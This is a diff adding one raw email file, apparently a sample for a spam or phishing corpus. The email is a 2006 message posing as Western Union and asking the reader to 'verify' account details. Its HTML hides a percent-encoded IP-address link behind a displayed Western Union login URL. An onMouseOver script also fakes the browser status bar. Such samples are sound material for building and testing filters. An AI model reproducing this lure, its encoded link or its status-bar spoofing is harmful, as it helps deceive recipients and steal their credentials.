@@ -1,0 +1,73 @@
+From nobody Sun Jan 25 13:48:13 2015
+Return-Path: <nobody@web.oneplan4u.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id E05BE5371FD
+ for <nobody@login.example.com>; Mon, 13 Feb 2006 12:20:01 -0500 (EST)
+Received: from web.oneplan4u.com (unknown [65.75.135.50])
+ by mail2.example.com (Postfix) with ESMTP id 4202E6FA36D
+ for <nobody@example.com>; Mon, 13 Feb 2006 12:20:01 -0500 (EST)
+Received: from nobody by web.oneplan4u.com with local (Exim 4.52)
+ id 1F8hMm-00053B-PW
+ for nobody@example.com; Mon, 13 Feb 2006 19:20:01 +0200
+To: nobody@example.com
+Subject: Validate Your WesternUnion Account
+From: WesternUnion Department <WesternUnion@WesternUnion.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1F8hMm-00053B-PW@web.oneplan4u.com>
+Date: Mon, 13 Feb 2006 19:20:00 +0200
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - web.oneplan4u.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - web.oneplan4u.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 390
+
+
+				<body bgcolor="#FFFFFF">
+
+				<p align="left">
+				<img border="0" src="https://wumt.westernunion.com/en/images/banners/wu_header_tagline.en.jpg" width="774" height="48"></p>
+				<p align="left"><font size="5">Dear westernunion customer,</font><br>
+				During our regularly scheduled account maintenance and 
+				verification procedures, we have detected a slight error in your 
+				account information.</p>
+				<p align="left">This might be due to either of the following 
+				reasons:</p>
+				<p align="left">1. A recent change in your personal information 
+				( i.e. change of address).<br>
+				2. Submitting invalid information during the initial sign up 
+				process.</p>
+				<p align="left"><font face="Arial Narrow">Please update and 
+				verify your information by clicking the link below:</font></p>
+				<p align="left"><font face="Arial Narrow">
+				<a 
+href="http://%37%30%2E%38%35%2E%32%34%2E%32%32%38/%7E%61%72%61%62%63%6F%6D/%76%62%61%74%73%68%6D%69%6E%74/%31/%30/%30/%75%70%64%61%74%65/%75%70%64%61%74%65%2E%68%74%6D"
+"onMouseOver="status='https://wumt.westernunion.com/asp/regLogin.asp'; return true" 
+onMouseOut="status='';return 
+true">https://wumt.westernunion.com/asp/regLogin.asp/</a>.
+							</font> </p>
+				<p align="left"><font face="Arial Narrow">For help please contact Western Union Customer 
+							Service immediately by</font></p>
+				<p align="left"><font face="Arial Narrow">email at
+							<a onclick="return top.js.OpenExtLink(window,event,this)" target="_blank" href="mailto:customerservice@westernunion.com">
+							customerservice@westernunion<WBR>.com</a>&nbsp; or call us 
+							at 1-877-989-3268 . <br>
+							&nbsp;</font></p>
+							<p align="left"><font face="Arial Narrow">Thank you for using
+							<a onclick="return top.js.OpenExtLink(window,event,this)" target="_blank" href="http://westernunion.com">
+							westernunion.com</a>!</font><br>
+							-----------------------------------------------------------------------------
+
+
